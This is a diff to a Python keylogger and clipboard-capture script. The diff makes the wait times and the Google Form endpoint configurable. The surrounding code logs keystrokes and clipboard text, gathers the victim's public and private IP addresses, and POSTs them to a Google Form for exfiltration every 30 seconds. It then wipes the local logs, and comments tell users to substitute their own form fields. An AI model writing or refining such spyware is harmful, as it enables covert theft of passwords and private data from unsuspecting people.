@@ -10,6 +10,13 @@ import pyperclip
 import multiprocessing
 
 
+# customize the time (in secs)
+wait_time_to_post = 30
+wait_time_to_listen_clip = 1
+
+# Edit the url also edit fields in post_form function
+google_form_url = "https://docs.google.com/forms/d/e/1FAIpQLSdX1isUEfIf3rI2efwZwkucW73HAvlPXuXqQJ4udzvlWg_d7w/formResponse"
+
 keys_lock = ''
 clip_lock = ''
 
@@ -67,14 +74,14 @@ def listen_clip():
 			WriteToFile(log_clip_file, new_content + '\n')
 			clip_lock.release()
 			content = new_content
-		time.sleep(1)
+		time.sleep(wait_time_to_listen_clip)
 
 
 def post_form():
 	global keys_lock, clip_lock
 	while True:
-		time.sleep(30)
-		url = "https://docs.google.com/forms/d/e/1FAIpQLSdX1isUEfIf3rI2efwZwkucW73HAvlPXuXqQJ4udzvlWg_d7w/formResponse"
+		time.sleep(wait_time_to_post)
+
 		# Get public IP address
 		public_ip = requests.get('https://api.ipify.org').text
 		# Get private IP address
@@ -98,7 +105,7 @@ def post_form():
 			print('Empty thing')
 			return
 
-		# Data to be filled in the form
+		# Edit the entry.<id> fields to match you google form.
 		data = {
 			"entry.745369685": public_ip,
 			"entry.1437673380": private_ip,
@@ -109,7 +116,7 @@ def post_form():
 
 		print('Trying to write to form:\n', data)
 		try:
-			res = requests.post(url, data)
+			res = requests.post(google_form_url, data)
 			print(res)
 			# Clear file
 			open(log_keys_file, 'w').close()
